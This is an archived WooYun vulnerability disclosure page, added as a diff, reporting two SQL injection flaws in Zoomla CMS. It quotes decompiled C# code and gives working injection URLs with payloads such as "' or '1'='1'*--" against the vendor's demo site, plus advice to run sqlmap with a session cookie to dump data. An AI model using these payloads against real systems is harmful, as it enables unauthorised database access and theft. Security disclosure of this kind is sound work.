@@ -1,0 +1,246 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		逐浪CMS通用型SQL注入8+9（select型）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		逐浪CMS通用型SQL注入8+9（select型）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2013-12-19 11:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-19：	细节已通知厂商并且等待厂商处理中<br/>
+									1970-01-01：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-12-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">似乎逐浪开始想完全闭源了。已经准备阻止大家进行反编译了，暂时还不知道是用什么方法，以后如果研究出来的话再说吧。所以官方别再扯什么XXX源码包了，不开源不是丢人的事情，但是忽悠客户不是很好吧。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">相关的类：<br />
+<br />
+public class MIS_Target_planList : Page, IRequiresSessionState<br />
+<br />
+public class MIS_Target_ProList : Page, IRequiresSessionState<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入点1：<br />
+<br />
+</p><pre><code>public class MIS_Target_planList : Page, IRequiresSessionState<br />
+<br />
+    protected void Page_Load(object sender, EventArgs e)<br />
+    {<br />
+        this.buser.CheckIsLogin();<br />
+        if (!base.IsPostBack &amp;&amp; !string.IsNullOrEmpty(base.Request[&quot;id&quot;]))<br />
+        {<br />
+            this.id = DataConverter.CLng(base.Request[&quot;id&quot;]);  //id参数第一次过滤了<br />
+            this.dt = this.bll.Sel(&quot;MID =&quot; + base.Request[&quot;id&quot;], &quot;ID desc&quot;); //id参数第二次直接带入查询中了<br />
+            if (this.dt != null &amp;&amp; this.dt.Rows.Count &gt; 0)<br />
+            {<br />
+                this.Repeater3.DataSource = this.dt;<br />
+                this.Repeater3.DataBind();<br />
+            }<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+前台注册用户。<br />
+<br />
+http://demo.zoomla.cn/Mis/Plan/AddPlan.aspx<br />
+<br />
+添加计划<br />
+<br />
+访问http://demo.zoomla.cn/mis/target/planList.aspx?id=0<br />
+<br />
+可以看见计划都列出来了，把上面这个URL丢到工具里面，带上cookie即可：<br />
+<br />
+</p><p class="detail"><a href="../images/19114921f17d264935c5be5e12495046135cd997.jpg" target="_blank"><img src="../images/19114921f17d264935c5be5e12495046135cd997.jpg" alt="20131219114858.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入点2：<br />
+<br />
+</p><pre><code>public class MIS_Target_ProList : Page, IRequiresSessionState<br />
+    protected global_asax ApplicationInstance<br />
+    {<br />
+        get<br />
+        {<br />
+            return (global_asax)this.Context.ApplicationInstance;<br />
+        }<br />
+    }<br />
+    protected void Page_Load(object sender, EventArgs e)<br />
+    {<br />
+        this.buser.CheckIsLogin();<br />
+        if (!base.IsPostBack &amp;&amp; !string.IsNullOrEmpty(base.Request[&quot;types&quot;]) &amp;&amp; base.Request[&quot;types&quot;].ToString() == &quot;7&quot; &amp;&amp; !string.IsNullOrEmpty(base.Request[&quot;id&quot;]))<br />
+        {<br />
+            this.id = DataConverter.CLng(base.Request[&quot;id&quot;]);<br />
+            this.dt = this.bll.Sel(&quot;TargetID like &#039;%&quot; + base.Request[&quot;id&quot;] + &quot;%&#039; And IsSystem=0 &quot;, &quot;ID desc&quot;); //id参数没有过滤就带入SQL查询<br />
+            if (this.dt != null &amp;&amp; this.dt.Rows.Count &gt; 0)<br />
+            {<br />
+                this.Repeater3.DataSource = this.dt;<br />
+                this.Repeater3.DataBind();<br />
+            }<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+注册前台用户并登录<br />
+<br />
+http://demo.zoomla.cn/Mis/Project/Default.aspx<br />
+<br />
+点击新建项目<br />
+<br />
+随意新建一个项目。<br />
+<br />
+打开http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&amp;id=3<br />
+<br />
+页面空白<br />
+<br />
+打开http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&amp;id=3%&#039; or &#039;%&#039;=&#039;<br />
+<br />
+所有添加的项目信息都在里面<br />
+<br />
+把下面的链接还有cookie丢sqlmap就可以暴数据了<br />
+<br />
+http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&amp;id=3%&#039; or &#039;1&#039;=&#039;1&#039;*--<br />
+<br />
+</p><p class="detail"><a href="../images/19115440172f96b5035b173b2d91e0b26458a687.jpg" target="_blank"><img src="../images/19115440172f96b5035b173b2d91e0b26458a687.jpg" alt="20131219115410.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/19115449a5296c7ea2fb1ddf69ce9fc26390c54d.jpg" target="_blank"><img src="../images/19115449a5296c7ea2fb1ddf69ce9fc26390c54d.jpg" alt="20131219115424.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046434" title="逐浪CMS通用型SQL注入8+9（select型）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-12-19 11:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46434";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
